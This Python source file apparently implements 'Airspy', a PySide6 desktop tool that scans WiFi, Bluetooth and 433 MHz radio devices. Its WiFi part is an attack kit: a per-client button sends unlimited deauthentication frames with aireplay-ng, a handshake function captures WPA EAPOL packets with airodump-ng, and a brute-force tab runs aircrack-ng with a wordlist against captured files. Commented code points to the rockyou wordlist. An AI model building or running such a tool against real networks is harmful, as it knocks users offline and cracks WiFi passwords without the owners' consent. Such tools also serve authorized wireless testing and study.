##################
# VERSION A JOUR #
##################
import os
import sys
import subprocess
import json
import time
import csv
import requests
from PySide6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QTableWidget,
                                QTableWidgetItem, QLabel, QTabWidget, QHeaderView, QDialog, QPushButton, QProgressBar, QTextEdit, QFileDialog)
from PySide6.QtCore import Qt, Signal, QThread
from PySide6.QtGui import QPixmap, QTextCursor
from qt_material import apply_stylesheet
import select
from bleak import BleakScanner
import asyncio
import pyshark

def get_mac_vendor(mac_address):
    url = f"https://api.macvendors.com/{mac_address}"
    try:
        response = requests.get(url, timeout=2)
        if response.status_code == 200:
            return response.text.strip()
    except requests.RequestException:
        pass
    return "Unknown"

def scan_rtl433_live(frequency="433.92M"):
    return subprocess.Popen(["rtl_433", "-d", "soapy", "-f", frequency, "-F", "json"],
                            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True, bufsize=1)

async def scan_bluetooth():
    devices = await BleakScanner.discover()
    return [{"Name": dev.name or "Unknown", "Address": dev.address, "Signal": f"{dev.rssi} dBm"} for dev in devices]
    
class AircrackWorker(QThread):
    result_signal = Signal(str)

    def __init__(self, cap_file, wordlist):
        super().__init__()
        self.cap_file = cap_file
        self.wordlist = wordlist

    def run(self):
        try:
            command = ["aircrack-ng", "-w", self.wordlist, self.cap_file]
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            for line in iter(process.stdout.readline, ''):
                self.result_signal.emit(line.strip())

            process.stdout.close()
            process.wait()
        except Exception as e:
            self.result_signal.emit(f"Exception:\n{str(e)}")


class ClientPopup(QDialog):
    def __init__(self, ssid, bssid, channel, clients, parent=None):
        super().__init__(parent)
        self.setWindowTitle(f"Clients associated to {ssid}")
        self.setGeometry(300, 200, 600, 400)

        self.ssid = ssid
        self.bssid = bssid  
        self.channel = str(channel)
        self.clients = clients

        layout = QVBoxLayout()

        if clients:
            self.table = QTableWidget()
            self.table.setColumnCount(3)
            self.table.setHorizontalHeaderLabels(["Client MAC", "Signal (dBm)", "Deauth"])
            self.table.setRowCount(len(clients))
            self.table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)

            for row, client in enumerate(clients):
                self.table.setItem(row, 0, QTableWidgetItem(client["Station"]))
                self.table.setItem(row, 1, QTableWidgetItem(str(client["Signal"])))

                deauth_button = QPushButton("Deauth")
                deauth_button.clicked.connect(lambda _, c=client: self.deauth_client(c))
                self.table.setCellWidget(row, 2, deauth_button)

            layout.addWidget(self.table)
        else:
            label = QLabel("No clients associated.")
            label.setAlignment(Qt.AlignCenter)
            layout.addWidget(label)
            
        self.handshake_button = QPushButton("Capture Handshake")
        self.handshake_button.clicked.connect(self.capture_handshake)
        layout.addWidget(self.handshake_button)

        self.progress_bar = QProgressBar()
        self.progress_bar.setAlignment(Qt.AlignCenter)
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        layout.addWidget(self.progress_bar)

        self.status_label = QLabel("")
        self.status_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.status_label)

        close_button = QPushButton("Close")
        close_button.clicked.connect(self.close)
        layout.addWidget(close_button)

        self.setLayout(layout)

    def deauth_client(self, client):
        station_mac = client["Station"].split(" ")[0]  
        command = ["sudo", "aireplay-ng", "--deauth", "0", "-a", self.bssid, "-c", station_mac, "wlan0mon"]

        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"Sent deauth to {station_mac} on {self.bssid}")
        
    def capture_handshake(self):
        file_prefix = "/tmp/eapol"
        handshake_command = ["sudo", "airodump-ng", "-d", self.bssid, "-c", self.channel, "-w", file_prefix, "wlan0mon"]
        #deauth_command = ["sudo", "aireplay-ng", "--deauth", "0", "-a", self.bssid, "wlan0mon"]
        
        print("Starting handshake capture...")
        self.progress_bar.setValue(0)
        self.status_label.setText("Capturing handshake...")
        self.status_label.setStyleSheet("color: black;")
        
        handshake_process = subprocess.Popen(handshake_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        #time.sleep(5)
        #subprocess.Popen(deauth_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        for i in range(1, 101):
            time.sleep(0.3)
            self.progress_bar.setValue(i)
        
        handshake_process.terminate()
        handshake_process.wait()
        print("Capture stopped, checking for handshake...")
        
        eapol_file = f"{file_prefix}-01.cap"
        destination_folder = os.path.join(os.getcwd(), "captured_handshake")
        destination_file = os.path.join(destination_folder, f"{self.ssid}.cap")

        os.makedirs(destination_folder, exist_ok=True)

        try:
            cap = pyshark.FileCapture(eapol_file, display_filter="eapol")
            eapol_packets = list(cap)
            if eapol_packets:
                self.status_label.setText(f"Handshake captured! {len(eapol_packets)} EAPOL packets found.\nHandshake file copied to {destination_file}")
                self.status_label.setStyleSheet("color: green;")
                subprocess.run(["sudo", "cp", eapol_file, destination_file])
                #print(f"Handshake file copied to {destination_file}")
            else:
                self.status_label.setText("Handshake capture failed!")
                self.status_label.setStyleSheet("color: red;")
        except FileNotFoundError:
            self.status_label.setText("Capture file not found!")
            self.status_label.setStyleSheet("color: red;")
        
        subprocess.run("sudo rm /tmp/eap*", shell=True)
        
        """
        wordlist = "/usr/share/wordlists/rockyou.txt"
        crack_command = ["sudo", "aircrack-ng", eapol_file, "-w", wordlist]
        subprocess.Popen(crack_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("Nothing found")
        """

        

class NetworkScannerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Airspy")
        self.setGeometry(100, 100, 1200, 800)

        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout(main_widget)
        
        self.banner = QLabel()
        pixmap = QPixmap("logo.png")
        pixmap = pixmap.scaledToWidth(350, Qt.SmoothTransformation)
        self.banner.setPixmap(pixmap)
        self.banner.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.banner)

        self.tabs = QTabWidget()
        self.wifi_tab = QWidget()
        self.bluetooth_tab = QWidget()
        self.rtl_tab = QWidget()
        self.tabs.addTab(self.wifi_tab, "WiFi")
        self.tabs.addTab(self.bluetooth_tab, "Bluetooth")
        self.tabs.addTab(self.rtl_tab, "SDR")
        layout.addWidget(self.tabs)

        self.exit_button = QPushButton("EXIT")
        self.exit_button.clicked.connect(self.exit_application)
        layout.addWidget(self.exit_button)

        self.setup_wifi_tab()
        self.setup_other_tabs()
        self.scanner = ScannerWorker("433.92M")
        self.scanner.wifi_result.connect(self.update_wifi_table)
        self.scanner.bluetooth_result.connect(self.update_bluetooth_table)
        self.scanner.rtl_result.connect(self.update_rtl_table)
        self.scanner.start()

    def exit_application(self):
        print("Exiting application...")
        sys.exit(0)

    def setup_wifi_tab(self):
        wifi_layout = QVBoxLayout(self.wifi_tab)
        self.wifi_tabs = QTabWidget()

        self.wifi_scan_tab = QWidget()
        scan_layout = QVBoxLayout(self.wifi_scan_tab)

        self.wifi_table = QTableWidget()
        self.wifi_table.setColumnCount(6)
        self.wifi_table.setHorizontalHeaderLabels(["SSID", "BSSID", "Signal", "Channel", "Security", "Clients"])
        self.wifi_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        scan_layout.addWidget(self.wifi_table)

        self.wifi_tabs.addTab(self.wifi_scan_tab, "Scan WiFi")

        self.brute_force_tab = QWidget()
        brute_layout = QVBoxLayout(self.brute_force_tab)

        self.cap_label = QLabel("CAP File:")
        self.cap_path = QLabel("No file selected")
        self.cap_button = QPushButton("Select .cap File")
        self.cap_button.clicked.connect(self.select_cap_file)

        self.wordlist_label = QLabel("Dictionary:")
        self.wordlist_path = QLabel("No file selected")
        self.wordlist_button = QPushButton("Select Dictionary")
        self.wordlist_button.clicked.connect(self.select_wordlist_file)

        self.start_brute_button = QPushButton("Start Brute-force")
        self.start_brute_button.clicked.connect(self.start_bruteforce)

        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)

        brute_layout.addWidget(self.cap_label)
        brute_layout.addWidget(self.cap_path)
        brute_layout.addWidget(self.cap_button)
        brute_layout.addWidget(self.wordlist_label)
        brute_layout.addWidget(self.wordlist_path)
        brute_layout.addWidget(self.wordlist_button)
        brute_layout.addWidget(self.start_brute_button)
        brute_layout.addWidget(self.output_text)

        self.wifi_tabs.addTab(self.brute_force_tab, "Brute-force .cap")

        wifi_layout.addWidget(self.wifi_tabs)

        self.wifi_table.cellClicked.connect(self.on_wifi_clicked)

    def setup_other_tabs(self):
        for tab, name, headers in [
            (self.bluetooth_tab, "bluetooth", ["Name", "Address", "Signal"]),
            (self.rtl_tab, "rtl", ["Model", "Data"])
        ]:
            layout = QVBoxLayout(tab)
            table = QTableWidget()
            table.setColumnCount(len(headers))
            table.setHorizontalHeaderLabels(headers)
            table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
            layout.addWidget(table)
            setattr(self, f"{name}_table", table)
            
    def update_wifi_table(self, networks):
        self.wifi_table.setRowCount(0)
        self.wifi_networks = networks
        for row_index, ap in enumerate(networks):
            self.wifi_table.insertRow(row_index)
            self.wifi_table.setItem(row_index, 0, QTableWidgetItem(ap["SSID"]))
            self.wifi_table.setItem(row_index, 1, QTableWidgetItem(ap["BSSID"]))
            self.wifi_table.setItem(row_index, 2, QTableWidgetItem(str(ap["Signal"])))
            self.wifi_table.setItem(row_index, 3, QTableWidgetItem(str(ap["Channel"])))
            self.wifi_table.setItem(row_index, 4, QTableWidgetItem(ap["Security"]))
            self.wifi_table.setItem(row_index, 5, QTableWidgetItem(str(len(ap["Clients"]))))

    def update_rtl_table(self, signals):
        self.rtl_table.setRowCount(len(signals))
        for row, entry in enumerate(signals):
            self.rtl_table.setItem(row, 0, QTableWidgetItem(entry["Model"]))
            self.rtl_table.setItem(row, 1, QTableWidgetItem(entry["Data"]))

    def update_bluetooth_table(self, devices):
        self.update_table(self.bluetooth_table, devices)
    
    def update_table(self, table, data):
        table.setRowCount(len(data))
        for row, entry in enumerate(data):
            for col, key in enumerate(entry):
                table.setItem(row, col, QTableWidgetItem(str(entry[key])))

    def on_wifi_clicked(self, row, _):
        ap = self.wifi_networks[row]
        popup = ClientPopup(ap["SSID"], ap["BSSID"].split(" ")[0], ap["Channel"], ap["Clients"], self)
        popup.exec()

    def closeEvent(self, event):
        self.scanner.stop()
        self.scanner.wait()
        event.accept()

    def select_cap_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select .cap File", "", "CAP Files (*.cap)")
        if file_path:
            self.cap_path.setText(file_path)

    def select_wordlist_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Dictionary", "", "Text Files (*.txt)")
        if file_path:
            self.wordlist_path.setText(file_path)

    def start_bruteforce(self):
        cap_file = self.cap_path.text()
        wordlist = self.wordlist_path.text()

        if "No file selected" in cap_file or "No file selected" in wordlist:
            self.output_text.setText("Please select a .cap file and a dictionary.")
            return

        self.output_text.setText("Starting brute-force...")
        self.worker = AircrackWorker(cap_file, wordlist)
        self.worker.result_signal.connect(self.display_bruteforce_result)
        self.worker.start()

    def display_bruteforce_result(self, result):
        self.output_text.append(result)
        self.output_text.moveCursor(QTextCursor.End)

class ScannerWorker(QThread):
    wifi_result = Signal(list)
    bluetooth_result = Signal(list)
    rtl_result = Signal(list)

    def __init__(self, rtl_frequency="433.92M"):
        super().__init__()
        self.rtl_frequency = rtl_frequency
        self.rtl_process = None
        self.running = True

    def run(self):
        self.rtl_process = scan_rtl433_live(self.rtl_frequency)
        while self.running:
            print("--> scan wifi")
            wifi_results = scan_wifi(10)
            self.wifi_result.emit(wifi_results)
            print("--> scan BT")
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            bt_results = loop.run_until_complete(scan_bluetooth())
            self.bluetooth_result.emit(bt_results)
            loop.close()
            print("--> scan RTL")
            rtl_results = self.read_rtl_output()
            self.rtl_result.emit(rtl_results)
            time.sleep(300)

    def read_rtl_output(self):
        results = []
        start_time = time.time()
        if not self.rtl_process:
            return results
        try:
            while time.time() - start_time < 10:
                rlist, _, _ = select.select([self.rtl_process.stdout], [], [], 0.5)
                if rlist:
                    line = self.rtl_process.stdout.readline().strip()
                    if line:
                        try:
                            data = json.loads(line)
                            results.append({"Model": data.get("model", "Unknown"), "Data": json.dumps(data)})
                        except json.JSONDecodeError:
                            continue
                if len(results) > 0:
                    break
                time.sleep(10)
        except Exception as e:
            print(f"Error reading RTL-SDR output: {e}")
        return results

    def stop(self):
        self.running = False
        if self.rtl_process:
            self.rtl_process.terminate()
            self.rtl_process.wait()

def scan_wifi(timeout):
    print("WIFI SCAN")
    csv_file = "/tmp/airodump-01.csv"
    process = subprocess.Popen(
        ["sudo", "airodump-ng", "wlan0mon", "--write", "/tmp/airodump", "--output-format", "csv"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(timeout)
    process.terminate()
    process.wait()

    try:
        with open(csv_file, "r", encoding="ISO-8859-1") as file:
            reader = csv.reader(file)
            rows = list(reader)
    except FileNotFoundError:
        return []

    ap_list = []
    client_list = []
    parsing_clients = False

    for row in rows:
        if len(row) < 2:
            continue
        if "Station MAC" in row[0]:  
            parsing_clients = True
            continue

        if not parsing_clients:
            if len(row) > 13: 
                try:
                    bssid = row[0].strip()
                    signal = int(row[8].strip()) if row[8].strip().lstrip('-').isdigit() else -100  
                    channel = int(row[3].strip()) if row[3].strip().isdigit() else -1
                    security = row[5].strip()
                    cipher = row[6].strip() if row[6].strip() else "Unknown"
                    auth = row[7].strip() if row[7].strip() else "Unknown"
                    essid = row[13].strip()
                    vendor = get_mac_vendor(bssid)

                    ap_entry = {
                        "SSID": essid if essid else "<Hidden>",
                        "BSSID": f"{bssid} ({vendor})",
                        "Signal": signal,
                        "Channel": channel,
                        "Security": f"{security} {cipher} {auth}",
                        "Clients": []
                    }
                    ap_list.append(ap_entry)
                except ValueError:
                    continue
        else:
            if len(row) > 6:
                try:
                    station_mac = row[0].strip()
                    associated_bssid = row[5].strip()
                    signal = int(row[3].strip()) if row[3].strip().lstrip('-').isdigit() else -100
                    vendor = get_mac_vendor(station_mac)

                    client_entry = {
                        "Station": f"{station_mac} ({vendor})",
                        "Signal": signal
                    }

                    for ap in ap_list:
                        if associated_bssid in ap["BSSID"]:
                            ap["Clients"].append(client_entry)
                            break
                except ValueError:
                    continue

    subprocess.run("sudo rm /tmp/airodump-01.csv", shell=True)
    return ap_list

if __name__ == "__main__":
    app = QApplication(sys.argv)
    apply_stylesheet(app, theme='dark_teal.xml')
    window = NetworkScannerGUI()
    window.show()
    sys.exit(app.exec())
